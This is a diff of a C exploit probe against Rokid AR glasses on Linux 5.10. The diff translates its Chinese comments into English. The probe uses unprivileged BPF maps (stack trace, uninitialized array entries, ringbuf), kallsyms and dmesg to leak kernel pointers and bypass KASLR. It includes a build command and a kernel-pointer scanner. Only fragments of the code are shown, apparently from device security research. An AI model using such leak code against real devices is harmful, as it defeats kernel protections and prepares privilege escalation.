@@ -1,15 +1,15 @@
 /*
  * BPF Information Leak Probe for Rokid AR Glasses
  *
- * 目標: 利用 BPF 進行 KASLR 繞過和內核信息洩漏
- * 設備: Linux 5.10.209-perf, unprivileged_bpf_disabled=0
+ * Goal: use BPF for KASLR bypass and a kernel information leak
+ * Device: Linux 5.10.209-perf, unprivileged_bpf_disabled=0
  *
- * 策略:
- * 1. 使用 BPF_MAP_TYPE_STACK_TRACE 洩漏內核棧地址
- * 2. 使用 BPF_PROG_TYPE_SOCKET_FILTER 進行 map 操作
- * 3. 分析 map value 中的內核指針
+ * Strategy:
+ * 1. Use BPF_MAP_TYPE_STACK_TRACE to leak kernel stack addresses
+ * 2. Use BPF_PROG_TYPE_SOCKET_FILTER for map operations
+ * 3. Analyze the kernel pointers in map values
  *
- * 編譯:
+ * Build:
  * $NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android31-clang.cmd -static -O2 -o bpf_leak bpf_info_leak.c
  */
 
@@ -100,7 +100,7 @@ static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
     return syscall(__NR_bpf, cmd, attr, size);
 }
 
-/* BPF 指令宏 */
+/* BPF instruction macros */
 #define BPF_LD_IMM64(DST, IMM)                                                                         \
     ((struct bpf_insn){.code = 0x18, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = (uint32_t)(IMM)}), \
         ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = (uint32_t)((IMM) >> 32)})
@@ -184,12 +184,12 @@ void scan_kernel_pointers(const void *data, size_t size, const char *desc)
     {
         uint64_t val = p[i];
 
-        // ARM64 內核地址通常在 0xffff... 範圍
+        // ARM64 kernel addresses are usually in the 0xffff... range
         if ((val >> 48) == 0xffff)
         {
             printf("[!] Possible kernel pointer at offset %zu: 0x%016lx\n", i * 8, val);
         }
-        // 或者在某些配置下可能是其他範圍
+        // or under some configurations may be in another range
         else if ((val >> 56) == 0xff && val != 0xffffffffffffffff)
         {
             printf("[?] Suspicious value at offset %zu: 0x%016lx\n", i * 8, val);
@@ -217,7 +217,7 @@ int try_array_map_leak(void)
 {
     printf("\n=== Strategy 2: Array Map Uninitialized Memory ===\n");
 
-    // 創建一個較大的 array map
+    // Create a fairly large array map
     int fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 4096, 16);
     if (fd < 0)
     {
@@ -227,7 +227,7 @@ int try_array_map_leak(void)
 
     printf("[+] Array map created: fd=%d\n", fd);
 
-    // 嘗試讀取未初始化的 entries
+    // Try reading uninitialized entries
     uint8_t value[4096];
 
     for (int key = 0; key < 16; key++)
@@ -236,7 +236,7 @@ int try_array_map_leak(void)
 
         if (map_lookup(fd, &key, value) == 0)
         {
-            // 檢查是否有非零數據
+            // Check whether there is non-zero data
             int non_zero = 0;
             for (int i = 0; i < 4096; i++)
             {
@@ -260,7 +260,7 @@ int try_ringbuf_leak(void)
 {
     printf("\n=== Strategy 3: BPF_MAP_TYPE_RINGBUF ===\n");
 
-    // 嘗試創建 ringbuf (需要較新內核)
+    // Try creating a ringbuf (requires a newer kernel)
     union bpf_attr attr = {
         .map_type = BPF_MAP_TYPE_RINGBUF,
         .key_size = 0,
@@ -389,7 +389,7 @@ int main(int argc, char *argv[])
     printf("  Kernel: 5.10.209-perf\n");
     printf("=================================================\n");
 
-    // 檢查 BPF 是否可用
+    // Check whether BPF is available
     printf("\n[*] Checking BPF availability...\n");
 
     int fd = create_map(BPF_MAP_TYPE_HASH, 4, 4, 1);
@@ -401,7 +401,7 @@ int main(int argc, char *argv[])
     printf("[+] BPF is available!\n");
     close(fd);
 
-    // 執行各種洩漏策略
+    // Run the various leak strategies
     try_proc_kallsyms();
     try_dmesg_leak();
     try_stack_trace_map();
